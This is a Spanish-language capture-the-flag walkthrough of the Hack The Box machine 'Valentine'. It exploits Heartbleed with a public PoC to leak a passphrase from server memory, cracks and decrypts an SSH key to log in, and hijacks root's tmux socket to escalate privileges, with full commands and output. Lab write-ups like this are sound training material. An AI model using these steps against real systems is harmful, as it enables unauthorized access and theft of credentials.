❯ testssl --heartbleed valentine.htb:443


#####################################################################
  testssl version 3.2rc4 from https://testssl.sh/dev/

  This program is free software. Distribution and modification under
  GPLv2 permitted. USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK!

  Please file bugs @ https://testssl.sh/bugs/

#####################################################################

  Using OpenSSL 3.4.0 22 Oct 2024  [~96 ciphers]
  on kali:/usr/bin/openssl

 Start 2025-02-27 05:35:44                -->> 10.10.10.79:443 (valentine.htb) <<--

 A record via:           /etc/hosts 
 rDNS (10.10.10.79):     --
 Service detected:       HTTP

 Testing for heartbleed vulnerability 

 Heartbleed (CVE-2014-0160)                VULNERABLE (NOT ok)


 Done 2025-02-27 05:35:48 [   7s] -->> 10.10.10.79:443 (valentine.htb) <<--
```

{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2014-0160" %}

{% hint style="danger" %}
Las implementaciones de (1) TLS y (2) DTLS en OpenSSL 1.0.1 en versiones anteriores a 1.0.1g no manejan adecuadamente paquetes Heartbeat Extension, lo que permite a atacantes remotos obtener información sensible desde la memoria de proceso a través de paquetes manipulados que desencadenan una sobrelectura del buffer, según lo demostrado mediante la lectura de claves privadas, relacionado con d1\_both.c y t1\_lib.c, también conocido como bug Heartbleed.
{% endhint %}

Realizando una búsqueda por Internet, nos encontramos con el siguiente repositorio de GitHub el cual nos ofrece un PoC de cómo realizar la explotación de la vulnerabilidad.

{% embed url="https://github.com/mpgn/heartbleed-PoC" %}

```bash
❯ git clone https://github.com/mpgn/heartbleed-PoC; cd heartbleed-PoC
Clonando en 'heartbleed-PoC'...
remote: Enumerating objects: 19, done.
remote: Total 19 (delta 0), reused 0 (delta 0), pack-reused 19 (from 1)
Recibiendo objetos: 100% (19/19), 5.79 KiB | 1.45 MiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
```

Ejecutaremos el script de `heartbleed-exploit.py` a través de `Python2` e indicaremos el dominio vulnerable. Comprobamos que se nos ha creado un archivo llamado `out.txt` con la información recibida de la vulnerabilidad.

```bash
❯ python2 heartbleed-exploit.py valentine.htb
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
```

Al revisar el contenido del archivo `out.txt` nos encontramos con el siguiente contenido, el cual en un principio no nos ofrece nada interesante.

```bash
❯ head -n 30 out.txt
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 61 6C 69 76  ....#.......aliv
  00e0: 65 0D 0A 48 6F 73 74 3A 20 76 61 6C 65 6E 74 69  e..Host: valenti
  00f0: 6E 65 2E 68 74 62 0D 0A 55 73 65 72 2D 41 67 65  ne.htb..User-Age
  0100: 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20  nt: Mozilla/5.0 
  0110: 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4E 6D 61  (compatible; Nma
  0120: 70 20 53 63 72 69 70 74 69 6E 67 20 45 6E 67 69  p Scripting Engi
  0130: 6E 65 3B 20 68 74 74 70 73 3A 2F 2F 6E 6D 61 70  ne; https://nmap
  0140: 2E 6F 72 67 2F 62 6F 6F 6B 2F 6E 73 65 2E 68 74  .org/book/nse.ht
  0150: 6D 6C 29 0D 0A 0D 0A 47 45 54 20 2F 77 61 79 2D  ml)....GET /way-
  0160: 62 6F 61 72 64 2F 20 48 54 54 50 2F 31 2E 31 0D  board/ HTTP/1.1.
  0170: 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 6B 65 65  .Connection: kee
  0180: 70 2D 61 6C 69 76 65 0D 0A 48 6F 73 74 3A 20 76  p-alive..Host: v
  0190: 61 6C 65 6E 74 69 6E 65 2E 68 74 62 0D 0A 55 73  alentine.htb..Us
  01a0: 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C  er-Agent: Mozill
  01b0: 61 2F 35 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C  a/5.0 (compatibl
  01c0: 65 3B 20 4E 6D 61 70 20 53 63 72 69 70 74 69 6E  e; Nmap Scriptin
  01d0: 67 20 45 6E 67 69 6E 65 3B 20 68 74 74 70 73 3A  g Engine; https:
```

Ejecutaremos varias veces y comprobaremos el archivo `out.txt` nuevamente, para obtener más información recopilada a través de la memoria debido a la vulnerabilidad de `Heartbleed`.

En uno de los resultados obtenidos, comprobamos que se hace mención de un archivo llamado `decode.php` (algo parecido a lo que encontramos inicialmente en el archivo `notes.txt`). Este archivo al parecer se está tramitando una variable `$text` la cual contiene un contenido que parece estar codificado en Base64.

```bash
❯ head -n 30 out.txt
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D A8  mV0aGVoeXBlCg==.
  0160: 9A F1 66 0F 5F 71 A3 6A 7A BC 9D FD 51 D1 A7 A5  ..f._q.jz...Q...
  0170: C1 47 C3 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  .G..............
  0180: 03 02 03 01 00 2D 00 02 01 01 00 33 00 26 00 24  .....-.....3.&.$
  0190: 00 1D 00 20 AF 86 59 41 AB 94 7C FE 62 D5 4F 90  ... ..YA..|.b.O.
  01a0: 3B 43 C5 97 26 1F BB FC 04 F1 82 35 7C 75 89 3A  ;C..&......5|u.:
  01b0: 6A F6 1F 4E 00 1B 00 05 04 00 01 00 03 00 15 00  j..N............
  01c0: 3F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ?...............
  01d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
```

Descodificamos el contenido obtenido y nos encontramos con el siguiente contenido: `heartbleedbelievethehype`.

```bash
❯ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d -w 0
heartbleedbelievethehype
```

Probamos de autenticarnos con estas credenciales con el usuari&#x6F;**`hype`** (suponiendo que este es el nombre del usuario, debido al nombre del archivo que teníamos anteriormente `hype_key`), pero nos muestra un mensaje de error.

```bash
❯ sshpass -p 'heartbleedbelievethehype' ssh hype@valentine.htb
Permission denied, please try again.
```

### Decrypting an RSA Private Key

Con lo cual, lo que decidimos es comprobar si con esta contraseña podíamos llegar a desencriptar la `RSA Private Key`almacenada en `hype_key`. Por lo tanto, probamos de añadir `heartbleedbelievethehype` en el diccionario `rockyou.txt` y intentamos crackear nuevamente el hash obtenido anteriormente en el archivo `hype_key.hash`. Como resultado obtenido, comprobamos que ahora que la contraseña si está presente en el diccionario, si ha logrado crackear el hash de la `RSA Private Key`.

```bash
❯ john --wordlist:/usr/share/wordlists/rockyou.txt hype_key.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
heartbleedbelievethehype (hype_key)     
1g 0:00:00:00 DONE (2025-02-27 18:26) 100.0g/s 6400p/s 6400c/s 6400C/s 123456..hello
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Una vez confirmado esa prueba, decidimos en desencriptar la `RSA Private Key` con las credenciales obtenidas. Comprobamos que hemos podido desencriptar la clave y le daremos los permisos necesarios para poder utilizar esa clave SSH privada.

```bash
❯ openssl rsa -in hype_key -out hype_key_decrypted
Enter pass phrase for hype_key:
writing RSA key

❯ ls -l hype_key_decrypted
.rw------- kali kali 1.7 KB Thu Feb 27 05:46:36 2025  hype_key_decrypted

❯ file hype_key_decrypted
hype_key_decrypted: OpenSSH private key (no password)

❯ chmod 600 hype_key_decrypted
```

## Accessing on SSH trough SSH-RSA key rejected "no mutual signature algorithm"

Probaremos de autenticarnos con esta clave privada SSH del usuario **`hype`**, pero al intentar acceder se nos muestra el siguiente mensaje de error. Posiblemente por un problema entre nuestro OpenSSH y el del servidor.

Realizando una búsqueda por Internet, nos encontramos con el siguiente blog de Confluence en el cual nos explican la manera de solucionar este problema. Para poder corregir este error y poder acceder con la clave privada, deberemos de rehabilitar el `RSA`.

```bash
❯ ssh -i hype_key_decrypted hype@valentine.htb
sign_and_send_pubkey: no mutual signature supported
hype@valentine.htb's password: 
```

{% embed url="https://confluence.atlassian.com/bitbucketserverkb/ssh-rsa-key-rejected-with-message-no-mutual-signature-algorithm-1026057701.html" %}

<figure><img src="../../.gitbook/assets/imagen (454).png" alt=""><figcaption></figcaption></figure>

Aplicaremos el Workaround que se nos mencioanaba y comprobamos que finalmente logramos obtener el acceso al sistema con el usuario **`hype`**&#x79; podemos localizar la flag **user.txt**.

```bash
❯ ssh -i hype_key_decrypted -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@valentine.htb
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ cat user.txt 
6bc88ec**************************
```

## Privilege Escalation

### Tmux Socket File Session

Revisando los procesos que se encuentran en ejecución en el sistema, comprobamos que el usuario **`root`** parece estar utilizando `Tmux` con un `Tmux Socket File Session`ubicado en `/.devs/dev_sess`.

{% hint style="info" %}
tmux es un multiplexor de terminal de código abierto para sistemas operativos tipo Unix. Permite acceder a múltiples sesiones de terminal simultáneamente en una sola ventana . Es útil para ejecutar más de un programa de línea de comandos al mismo tiempo.
{% endhint %}

```bash
hype@Valentine:/.devs$ ps aux | grep tmux
root       1048  0.0  0.1  26416  1668 ?        Ss   20:16   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

Desde la raíz `/` del sistema accederemos al directorio `.devs` en el cual comprobamos la existencia del archivo `dev_sess` el cual se trata de un Socket que está siendo utilizado por el usuario **`root`**.

```bash
hype@Valentine:/$ cd .devs/

hype@Valentine:/.devs$ ls -la
total 8
drwxr-xr-x  2 root hype 4096 Feb 26 20:16 .
drwxr-xr-x 26 root root 4096 Aug 24  2022 ..
srw-rw----  1 root hype    0 Feb 26 20:16 dev_sess

hype@Valentine:/.devs$ file dev_sess 
dev_sess: socket

hype@Valentine:/.devs$ w
 20:53:51 up 37 min,  1 user,  load average: 0.04, 0.08, 0.15
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
hype     pts/0    10.10.14.2       20:52    0.00s  0.22s  0.00s w
```

Revisaremos que el binario de `Tmux`se encuentra habilitado en el equipo y utillizaremos el `Socket File` a través del parámetro `-S`.

```bash
hype@Valentine:/.devs$ which tmux
/usr/bin/tmux
hype@Valentine:/.devs$ tmux -S dev_sess 
```

Comprobamos que accedemos a la sesión de `Tmux` del usuario **`root`** y logramos obtener la flag **root.txt**.

```bash
root@Valentine:/.devs# whoami
root
root@Valentine:/.devs# cat /root/root.txt 
80b5****************************
```
